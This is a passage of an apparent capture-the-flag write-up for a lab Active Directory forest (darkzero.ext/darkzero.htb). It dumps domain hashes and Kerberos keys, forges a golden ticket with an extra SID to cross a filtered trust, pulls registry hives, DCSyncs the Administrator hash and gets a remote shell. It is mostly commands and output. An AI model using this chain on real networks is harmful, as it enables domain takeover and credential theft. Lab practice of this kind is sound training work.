darkzero-ext\DC02$:plain_password_hex:735441f4eb3d2d6e7d4d04d5e25d6d9eb0c63788eefbcdaed78e16ca14cf1f288026c05e129f069edd785e490357b4df08cdd5cc5e4192e50b68544755f4afd3dac30b9b31c30140ca87f0bfe3d7bf99de8e28ab04e576575af148754e365c8823141eecc4098216c60e97c6f5ebee16d5d1a9b55505c7f91d5d6f3eacba045da860ed030618725321c638b2d04a069296e1dc753d43705aa7616d143a42d7f8c4757bde0a113dfdfcbd3e1cc327abc510c0c0d7a85eb755fb52de8d110164015e22c744b874ec9bffee380f9e8ece479ecc59c676ada0514fd7151a7f48fdff05822d34d5924f3aa3da74b1359a71fc
darkzero-ext\DC02$:aad3b435b51404eeaad3b435b51404ee:297d0ed36ca7ca87dcde2b2c8412ba60:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xfb6fb33d7248b0102223bd5111c6172701d5afef
dpapi_userkey:0x7717083c6d752578183c058d2cafe4a98365ec92
[*] NL$KM 
 0000   D9 BE CA 8C 37 88 DF 9B  E2 EB 0B E0 49 32 1C 8C   ....7.......I2..
 0010   CC 0F 66 5C 4D 5C 36 48  45 B9 53 19 4F D3 C9 33   ..f\M\6HE.S.O..3
 0020   D8 9C 73 2B 4B D2 38 3B  05 93 BA 2E B2 8D F4 F3   ..s+K.8;........
 0030   8C E8 F7 6C 06 DF F8 99  8D 77 ED 0D AB F7 25 89   ...l.....w....%.
NL$KM:d9beca8c3788df9be2eb0be049321c8ccc0f665c4d5c364845b953194fd3c933d89c732b4bd2383b0593ba2eb28df4f38ce8f76c06dff8998d77ed0dabf72589
[*] _SC_Gitea 
darkzero-ext\svc-gitea:SMvUAmVFTY7!
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2bdd03aa4dc9ff2c4f19860e380618:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8beaf5f950fefe79f608390a806d29a7:::
darkzero.ext\david:1104:aad3b435b51404eeaad3b435b51404ee:57652eef49f116d28846990ccddb7b47:::
darkzero.ext\william:1105:aad3b435b51404eeaad3b435b51404ee:e9e4b9942000acabf654cbe83d4cf836:::
darkzero.ext\celia:1109:aad3b435b51404eeaad3b435b51404ee:ffd522a82693347e605dee2fa9beeb51:::
darkzero.ext\josh:1110:aad3b435b51404eeaad3b435b51404ee:cbacf36e107f69d4b76d2b3c4dc24a33:::
darkzero.ext\svc-gitea:1112:aad3b435b51404eeaad3b435b51404ee:f2ec6039e5a952c517742bcbfae633e5:::
darkzero.ext\svc-runner:1113:aad3b435b51404eeaad3b435b51404ee:8f02bbb99a9c1a57cb62c266b0c71ab0:::
root:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:297d0ed36ca7ca87dcde2b2c8412ba60:::
SRV01$:1108:aad3b435b51404eeaad3b435b51404ee:f6b89d7249b3621b43fa57a74f29116c:::
darkzero$:1103:aad3b435b51404eeaad3b435b51404ee:2df6a35394353e904db279359c14080b:::
[*] Kerberos keys grabbed
Administrator:0x14:3c4cb4af2ec77b5714f514c88d71d2c86bf1fe4e312521af9b578547fe633a5a
Administrator:0x13:4f183e4d16f14d6d889322414f7ebf94
Administrator:aes256-cts-hmac-sha1-96:357224179e090ac09df4cada21698695a395713fa1c5ac415a54b8b19c0f6966
Administrator:aes128-cts-hmac-sha1-96:cc3151ecd7fc10496b243108c7c53759
Administrator:0x17:6a2bdd03aa4dc9ff2c4f19860e380618
krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
krbtgt:aes128-cts-hmac-sha1-96:ce9c97f5fd7021806190196f637e4b4e
krbtgt:0x17:8beaf5f950fefe79f608390a806d29a7
darkzero.ext\david:0x14:49e55245f4edf283986e661313b2700122db7c796646910e03c6c27cf324c49d
darkzero.ext\david:0x13:bb7a8f86f5e7023bfc148a1894fe9838
darkzero.ext\david:aes256-cts-hmac-sha1-96:1e3ca219582c60ab71c0688c7c3219a2ca0fc57d22efc1f273201321c8d30c27
darkzero.ext\david:aes128-cts-hmac-sha1-96:b99bc8413abf9dd1cbd6f063e55d95cc
darkzero.ext\david:0x17:57652eef49f116d28846990ccddb7b47
darkzero.ext\william:0x14:d19711ef82f2e9684d82b913c5adbc97ee7bc7bcdf03120cdcc12fa8012cf728
darkzero.ext\william:0x13:ec0b8db518471117f471f776395519a4
darkzero.ext\william:aes256-cts-hmac-sha1-96:fe28d0569987f531b226a59b65eeeec7082d71aae39202d436536f97ad2fc532
darkzero.ext\william:aes128-cts-hmac-sha1-96:4389a71eb4b5d3d384fde3b7f433950f
darkzero.ext\william:0x17:e9e4b9942000acabf654cbe83d4cf836
darkzero.ext\celia:0x14:17174882aba17a8f5e48d501d99619cd6b3c517222f262f5abf10086ef85ddbc
darkzero.ext\celia:0x13:c226461170f835b9b8b971fdd620be20
darkzero.ext\celia:aes256-cts-hmac-sha1-96:3e588846fef6d35301e68da09dca7345c6f84e3edb2b6a3af3408177eb71140b
darkzero.ext\celia:aes128-cts-hmac-sha1-96:a413bd83e14fd0de345ec7f13bd4adbd
darkzero.ext\celia:0x17:ffd522a82693347e605dee2fa9beeb51
darkzero.ext\josh:0x14:e9ba88a38aabb4adfdec4a8b782ac9fcb48d711f147b947c7b7718bd8e5a1fe1
darkzero.ext\josh:0x13:fb3a42bbbab110cfeb8556d5604a7556
darkzero.ext\josh:aes256-cts-hmac-sha1-96:086f140d39b9e5bb41f6dad9d76dc67695fe4a0f2f86a86406316734621826aa
darkzero.ext\josh:aes128-cts-hmac-sha1-96:800b542e6c54b855f8101159fbd3d21f
darkzero.ext\josh:0x17:cbacf36e107f69d4b76d2b3c4dc24a33
darkzero.ext\svc-gitea:0x14:3a77284ebb6ee755610b2f7fd70ec94a71282f79f1e93dd52e0c5b69ca4b4b26
darkzero.ext\svc-gitea:0x13:eae3b349ebd18ff5849506dd2d56c62b
darkzero.ext\svc-gitea:aes256-cts-hmac-sha1-96:4d27f8144b5c49434938c7734f1a522e141c30b39b3c96698cf82bdec818a722
darkzero.ext\svc-gitea:aes128-cts-hmac-sha1-96:e982268ea8bf041209f1ea093f31eb54
darkzero.ext\svc-gitea:0x17:f2ec6039e5a952c517742bcbfae633e5
darkzero.ext\svc-runner:0x14:309d9f4e7f6b1396d784c3f2703b63ab80713ddcb988b4de9fd9f8be092a327e
darkzero.ext\svc-runner:0x13:372e0455a30fc98119a36212ad06c6f2
darkzero.ext\svc-runner:aes256-cts-hmac-sha1-96:11e8fdf4a10b8f19751804b2a431a1fe6bf40c79fe26f3db5063aa2e4e4570b1
darkzero.ext\svc-runner:aes128-cts-hmac-sha1-96:c7930141eef79f5c7fd2917d99dcf9d6
darkzero.ext\svc-runner:0x17:8f02bbb99a9c1a57cb62c266b0c71ab0
root:0x14:5c1c742800daa8b23749be313815aa1a53d5637420a40c4b4f8f9c9b3f627ed3
root:0x13:5aa12e7134c8c63f9651487513f6f1e4
root:aes256-cts-hmac-sha1-96:ee8f74932f13cf946f45921d406d4d4a9ab0c04d2c419d52a1170521b29eae9f
root:aes128-cts-hmac-sha1-96:0c0cc181f61261f40de2c74d680c3d05
root:0x17:2b576acbe6bcfda7294d6bd18041b8fe
DC02$:aes256-cts-hmac-sha1-96:d8cb694e2212d22714da90f476f85f2cbe62911affa83cbced7140df21a2461c
DC02$:aes128-cts-hmac-sha1-96:08addbe85bcedc597c61e413509bb858
DC02$:0x17:297d0ed36ca7ca87dcde2b2c8412ba60
SRV01$:0x14:e53a041706a728459af1c4bea37a5e6b280a0396c6901ebea3d7cd9c9f56e817
SRV01$:0x13:65618199caba9789214141c6b42053b6
SRV01$:aes256-cts-hmac-sha1-96:8ddd57e2b2b6b9231f5518e094eed8ec900309fd2259f2af343a3e9dbeeb714c
SRV01$:aes128-cts-hmac-sha1-96:65895714cf85fadae4e57f3594b20323
SRV01$:0x17:f6b89d7249b3621b43fa57a74f29116c
darkzero$:aes256-cts-hmac-sha1-96:ff0618a2d18360683b197232b262feae9a749325343e9ab68e22f681b4dc83a7
darkzero$:aes128-cts-hmac-sha1-96:000d1ff3b7b97163990b6623695946cd
[*] Cleaning up... 
```

`svc-gitea` : `SMvUAmVFTY7!`

# Enum trusts

```
bloodyAD -H DC02.darkzero.ext -d darkzero.ext -u 'celia' -p 'babygurl13' get trusts
darkzero.ext
 +-- <FOREST_TRANSITIVE|AD>:darkzero.htb
```

```
nxc ldap 172.16.20.2 -u 'celia' -p 'babygurl13' --dc-list 
LDAP        172.16.20.2     389    DC02             [*] Windows 11 / Server 2025 Build 26100 (name:DC02) (domain:darkzero.ext) (signing:Enforced) (channel binding:When Supported) 
LDAP        172.16.20.2     389    DC02             [+] darkzero.ext\celia:babygurl13 (admin)
LDAP        172.16.20.2     389    DC02             DC02.darkzero.ext = 172.16.20.2
LDAP        172.16.20.2     389    DC02             [+] Found DC in trusted domain: dc01.darkzero.htb
LDAP        172.16.20.2     389    DC02             darkzero.htb -> Bidirectional -> Forest Transitive
LDAP        172.16.20.2     389    DC02             dc01.darkzero.htb = 172.16.20.1
```

```
darkzero.htb -> Bidirectional -> Forest Transitive
```

```
bloodhound.py --zip -c All -d "darkzero.htb" -u "celia@darkzero.ext" -p 'babygurl13' -dc DC01.darkzero.htb -ns "172.16.20.1"
```

`darkzero.htb` sid = `S-1-5-21-2899195410-1848524783-1547768515`
`darkzero.ext` sid = `S-1-5-21-2850783758-1231244658-2051857529`


```
bloodyAD -H DC01.darkzero.htb --dc-ip 172.16.20.1 -d darkzero.ext -u celia -p babygurl13 \
  get object 'CN=darkzero.ext,CN=System,DC=darkzero,DC=htb' \
  --attr trustAttributes,trustDirection,trustPartner

distinguishedName: CN=darkzero.ext,CN=System,DC=darkzero,DC=htb
trustAttributes: FOREST_TRANSITIVE; TREAT_AS_EXTERNAL
trustDirection: BIDIRECTIONAL
trustPartner: darkzero.ext
```

`FOREST_TRANSITIVE; TREAT_AS_EXTERNAL` means there is filtering in place. By default the sid < 1000 are filtered.


![uncommon group darkzeroreturns](Images/uncommon%20group%20darkzeroreturns.png)

There is an uncommon group that is a member of the group `Backup Operators`. 
It's SID is `S-1-5-21-2899195410-1848524783-1547768515-1603` which might not be filtered.

# Compromised darkzero.htb
### Craft Golden Ticket

Let's craft a golden ticket with the SID of `InfrastructureAdministrators`  as extra.

```
ticketer.py \
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain darkzero.ext \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -user-id 1109 \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  celia
  
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/celia
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving/Updating ticket in celia.ccache
```

Then we request a Service Ticket

```
export KRB5CCNAME=celia.ccache
```

```
getST.py -k -no-pass -spn 'krbtgt/darkzero.htb' -dc-ip 172.16.20.2 darkzero.ext/celia

[*] Getting ST for user
[*] Saving ticket in celia@krbtgt_DARKZERO.HTB@DARKZERO.EXT.ccache
```


```
export KRB5CCNAME=celia@krbtgt_DARKZERO.HTB@DARKZERO.EXT.ccache 
```

```
getST.py -k -no-pass -spn 'cifs/dc01.darkzero.htb' -dc-ip 172.16.20.1 darkzero.htb/celia
```


### Hives retrieval

```
reg.py -k -no-pass -dc-ip 172.16.20.1 -target-ip 172.16.20.1 \
  darkzero.ext/celia@dc01.darkzero.htb backup -o 'C:\'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\SAM.save
[*] Saved HKLM\SYSTEM to C:\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\SECURITY.save
```

```
smbclientng -k --no-pass \                                        
  --ccache-file 'celia@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache' \ 
  -H dc01.darkzero.htb \
  -d darkzero.ext \
  -u celia
  
■[\\dc01.darkzero.htb\]> use C$
■[\\dc01.darkzero.htb\C$\]> ls
■[\\dc01.darkzero.htb\C$\]> get SAM.save SECURITY.save SYSTEM.save
```

### DCSync DC01.darkzero.htb

With the hives retrieval, we can dump the local database of `DC01.darkzero.htb`, which should dump the NTLM hash of the `DC01` machine account.

```
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL

<SNIP>

DARKZERO\DC01$:aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea:::
DARKZERO\DC01$:aes256-cts-hmac-sha1-96:25e878d205e933e9e4990104899a59479088201782134522f8ae10e0eda42da1

<SNIP>
```

Now that we have the credentials for the machine account, we can DCSync the domain using these credentials and retrieve every hashes of the domain, including the one for `administrator`.

```
secretsdump.py 'darkzero.htb/DC01$@dc01.darkzero.htb' \
  -hashes :686d06e419d66abfa5fefac2618cdcea -dc-ip 172.16.20.1 -just-dc-user Administrator

<SNIP>

Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::

<SNIP>
```

### Shell as administrator on DC01

```
evil-winrm -u administrator -H 4d470bb7497acf3f5f5c2a11872e02ac -i 172.16.20.1

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> [!TIP]
> **Machine Rooted**
